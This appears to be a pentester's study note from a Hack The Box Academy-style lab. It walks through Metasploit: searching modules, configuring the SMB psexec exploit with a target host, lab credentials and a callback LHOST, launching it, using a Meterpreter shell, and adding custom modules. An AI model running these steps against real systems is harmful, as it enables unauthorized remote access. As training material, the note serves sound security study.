---
tags:
  - Exploitation
  - Tooling
---
[Metasploit](https://www.metasploit.com/) is an automated attack framework developed by `Rapid7` that streamlines the process of exploiting vulnerabilities through the use of pre-built modules that contain easy-to-use options to exploit vulnerabilities and deliver payloads to gain a shell on a vulnerable system.
## Usage

```
sudo msfconsole
```

### Searching Modules 

```shell-session
search smb
```

Let's look at one module, in particular, to understand it within the context of payloads.

`56 exploit/windows/smb/psexec`

| Output     | Meaning                                                                                                                                                                       |
| ---------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `56`       | The number assigned to the module in the table within the context of the search. This number makes it easier to select. We can use the command `use 56` to select the module. |
| `exploit/` | This defines the type of module. In this case, this is an exploit module. Many exploit modules in MSF include the payload that attempts to establish a shell session.         |
| `windows/` | This defines the platform we are targeting. In this case, we know the target is Windows, so the exploit and payload will be for Windows.                                      |
| `smb/`     | This defines the service for which the payload in the module is written.                                                                                                      |
| `psexec`   | This defines the tool that will get uploaded to the target system if it is vulnerable.                                                                                        |

### Select Searched Module 

```shell-session
use 56
```

#### See Options 

```shell-session
options
```

#### Setting Options 

```shell-session
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
RHOSTS => 10.129.180.71
msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
SHARE => ADMIN$
msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
SMBPass => HTB_@cademy_stdnt!
msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
SMBUser => htb-student
msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
LHOST => 10.10.14.222
```

### Run Exploit

```
exploit
```

## Meterpreter Shell

### Interactive Shell

```shell-session
shell
```

### Get Current User

```shell-session
getuid
```
## Specific Usages

### SQL Usage

Using [[2. Enumeration/TCP/3306. MySQL (SQL)/1. Guide|SQL]] modules

[MSSQL for Pentester: Metasploit - Hacking Articles](https://www.hackingarticles.in/mssql-for-pentester-metasploit/)

## Upload Modules 

1. Locate a module to add to the Metasploit-framework.

Ensure Metasploit-framework is up-to-date:

```
apt update
apt install metasploit-framework
```

2. Metasploit exploit modules are kept in:

`/usr/share/metasploit-framework/modules/exploits

3. Copy the found [[Ruby]] script into the folder, at the required location in the file structure.

4. Reload Metasploit